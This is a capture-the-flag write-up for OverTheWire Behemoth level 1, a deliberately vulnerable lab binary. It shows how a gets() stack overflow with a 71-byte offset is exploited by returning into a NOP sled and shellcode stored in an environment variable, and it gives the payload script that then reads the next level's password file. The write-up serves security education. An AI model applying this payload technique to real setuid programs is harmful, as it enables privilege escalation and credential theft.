# OverTheWire — Behemoth Level 1 → 2

> Goal: Get behemoth2 password from `behemoth1`. Result: **`**********`** (hidden)
> Technique: `gets()` unlimited stack overflow → jump to NOP sled+shellcode in env.

---

## 1. Connection
```bash
ssh behemoth1@behemoth.labs.overthewire.org -p 2221
```

## 2. Recon
```bash
readelf -l /behemoth/behemoth1 | grep GNU_STACK   # RWE -> executable stack
echo "AAAA" | ltrace /behemoth/behemoth1
# printf("Password: ")
# gets(0xffffd365, ...)        <-- gets, UNLIMITED
# puts("Authentication failure.\nSorry.")
python3 -c "print('A'*100)" | /behemoth/behemoth1   # Segmentation fault -> EIP overwritten
```

## 3. Vulnerability + offset (disasm)
```
8049189:  sub esp, 0x44
8049199:  lea eax, [ebp-0x43]    ; buf = ebp-0x43
804919d:  call gets@plt          ; gets(buf) — no limit
```
`buf = ebp-0x43`, saved EIP at `ebp+4` → offset = `0x43 + 4 = **71**`. No canary, stack RWE, ASLR off.

## 4. Exploit
Put shellcode in `EGG` with a large NOP sled (40000), find its address with getenvaddr (19-char path =
`len("/behemoth/behemoth1")`):
```bash
cd /tmp
export EGG=$(python3 -c 'b"\x90"*40000 + SHELLCODE_57')      # setreuid+execve("/bin/sh")
ADDR=$(/tmp/bhm1getenvaddr EGG | ...)
RET=$((0x$ADDR + 20000))                                     # sled midpoint
# gets reads from stdin -> payload = "A"*71 + RET + "\n", then timed command
python3 -c "
import sys,time,struct
ret=int('$RET',16)
sys.stdout.buffer.write(b'A'*71 + struct.pack('<I',ret) + b'\n'); sys.stdout.flush(); time.sleep(1.0)
sys.stdout.buffer.write(b'id; cat /etc/behemoth_pass/behemoth2\n'); sys.stdout.flush(); time.sleep(1.0)
" | /behemoth/behemoth1
```
Output: `uid=13002(behemoth2)` → password.


## Lessons
| Topic | Note |
|-------|------|
| `gets()` | Unlimited → classic stack overflow, EIP overwrite |
| Offset 71 | `buf=ebp-0x43` → 67+4 |
| env shellcode | RWE stack + no ASLR → sled+shellcode in env, ret there |
| stdio buffering | `gets` slurps → payload+command with timing |
